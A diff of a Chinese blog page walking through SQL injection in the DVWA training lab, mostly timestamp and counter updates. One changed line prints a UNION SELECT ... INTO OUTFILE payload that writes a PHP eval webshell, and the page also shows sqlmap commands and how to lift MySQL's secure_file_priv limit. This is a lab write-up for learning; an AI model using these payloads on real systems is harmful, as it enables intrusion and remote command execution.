@@ -101,7 +101,7 @@
 <meta property="og:image" content="http://lulu.izliang.com/yty/baolipojie4.png">
 <meta property="og:image" content="http://lulu.izliang.com/yty/baolipojie5.png">
 <meta property="article:published_time" content="2020-03-14T07:14:39.000Z">
-<meta property="article:modified_time" content="2020-04-13T08:18:43.904Z">
+<meta property="article:modified_time" content="2020-05-13T14:24:04.202Z">
 <meta property="article:author" content="QuanYex">
 <meta property="article:tag" content="DVWA">
 <meta name="twitter:card" content="summary">
@@ -313,8 +313,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-04-13T16:18:43+08:00">
-                2020-04-13
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-13T22:24:04+08:00">
+                2020-05-13
               </time>
             
           </span>
@@ -534,7 +534,7 @@
 <p>显示空，这是因为<font color =red>mysql的secure_file_priv的新特性。</font>解决方法如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql新版本下 secure_file_priv字段：secure_file_priv参数是用来限制LOAD DATA,SELECT ...OUTFILE, and LOAD_FILE()传到哪个指定目录的。</span><br><span class="line"></span><br><span class="line">ure_file_priv的值为null,表示限制mysqld不允许导入&#x2F;导出</span><br><span class="line"></span><br><span class="line">当secure_file_priv的值为&#x2F;tmp&#x2F;，表示限制mysqld的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</span><br><span class="line"></span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制。</span><br><span class="line"></span><br><span class="line">资料地址: https:&#x2F;&#x2F;segmentfault.com&#x2F;a&#x2F;1190000009333563</span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line"></span><br><span class="line">&gt;&gt; show global variables like &#39;%secure%&#39;;</span><br><span class="line"></span><br><span class="line">默认的为NULL。</span><br><span class="line"></span><br><span class="line">修改mysql.ini或my.ini文件，在[mysqld]下加入</span><br><span class="line"></span><br><span class="line">secure_file_priv &#x3D;</span><br><span class="line"></span><br><span class="line">保存重启mysql即可。</span><br></pre></td></tr></table></figure>
 
-<p>还可以利用该漏洞写文件，在输入框中输入xx’ union select “xx”, “xx” into outfile ‘xx’ – 通过引发异常导致报错来得到web目录 <code>E:\phpstudy\WWW\DVWAmaster\vulnerabilities\sqli\source\low.php</code>接着在输入框中输入xx’ union select “&lt;?php @eval($_GET[‘cmd’]?);”, “webshell” into outfile ‘E:\phpstudy\WWW\DVWAmaster\cmd.php’ –    <font  color=red>没有执行成功</font>显示：Can’t create/write to file ‘E:\phpstudy\WWW\DVWAmaster\cmd.php’ (Errcode: 2)</p>
+<p>还可以利用该漏洞写文件，在输入框中输入xx’ union select “xx”, “xx” into outfile ‘xx’ – 通过引发异常导致报错来得到web目录 <code>E:\phpstudy\WWW\DVWAmaster\vulnerabilities\sqli\source\low.php</code>接着在输入框中输入xx’ union select “&lt;?php 艾特eval($_GET[‘cmd’]?);”, “webshell” into outfile ‘E:\phpstudy\WWW\DVWAmaster\cmd.php’ –    <font  color=red>没有执行成功</font>显示：Can’t create/write to file ‘E:\phpstudy\WWW\DVWAmaster\cmd.php’ (Errcode: 2)</p>
 <h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>进入cmd，e: ；cd sqlmap；使用sqlmap命令：<code>sqlmap.py -u &quot;http://quanyex.local.com/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=2ghptdtrr6159ml6gt8ik7bu05&quot;</code>执行结果如下：</p>
 <p><img src="http://lulu.izliang.com/yty/11bbd74c9ab776532a4f84dd860195b.png" alt=""></p>
 <p>继续查询当前用户和当前数据库<code>sqlmap.py -u &quot;http://quanyex.local.com/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=2ghptdtrr6159ml6gt8ik7bu05&quot; --current-user --current-db</code></p>
@@ -773,7 +773,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -795,7 +795,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
